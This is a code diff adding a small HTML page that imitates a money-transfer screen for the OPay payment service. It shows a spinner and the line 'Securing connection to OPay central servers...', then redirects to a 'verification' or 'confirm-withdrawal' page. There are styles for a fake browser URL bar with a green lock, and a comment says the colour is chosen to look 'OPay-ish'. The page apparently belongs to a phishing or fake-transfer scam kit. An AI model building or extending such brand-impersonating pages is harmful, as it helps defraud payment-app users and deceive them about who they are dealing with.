@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Processing Transfer</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #f8f9fa;
+      color: #333;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      overflow: hidden;
+    }
+    .time-bar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      background: white;
+      padding: 10px;
+      font-size: 14px;
+      border-bottom: 1px solid #ddd;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      z-index: 10;
+    }
+    .loader-container {
+      margin: 40px 0;
+    }
+    .spinner {
+      width: 80px;
+      height: 80px;
+      border: 8px solid #e0e0e0;
+      border-top: 8px solid #9b59b6; /* purple like OPay-ish */
+      border-radius: 50%;
+      animation: spin 1.2s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    h1 {
+      font-size: 24px;
+      margin: 20px 0 8px;
+      color: #2c3e50;
+    }
+    p {
+      font-size: 16px;
+      color: #7f8c8d;
+      max-width: 320px;
+      margin: 0 auto;
+    }
+   
+    .bottom-bar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      height: 60px;
+      background: white;
+      border-top: 1px solid #ddd;
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      font-size: 24px;
+    }
+    .url-bar {
+      position: fixed;
+      bottom: 60px;
+      left: 0;
+      right: 0;
+      background: #ecf0f1;
+      padding: 8px;
+      font-size: 13px;
+      color: #555;
+      text-align: center;
+      border-top: 1px solid #ddd;
+    }
+    .lock { color: green; }
+  </style>
+</head>
+<body>
+
+  <div class="loader-container">
+    <div class="spinner"></div>
+  </div>
+
+  <h1>Processing Transfer</h1>
+  <p>Securing connection to OPay central servers...</p>
+
+
+
+
+  <script>
+    // Auto-redirect to verification page after 4–6 seconds (adjust as needed)
+    setTimeout(() => {
+    window.location.href = "verification.html"; // or full path: "/verification.html" or "confirm-withdrawal.html"
+    }, 5000); // 5000ms = 5 seconds
+  </script>
+
+</body>
+</html>
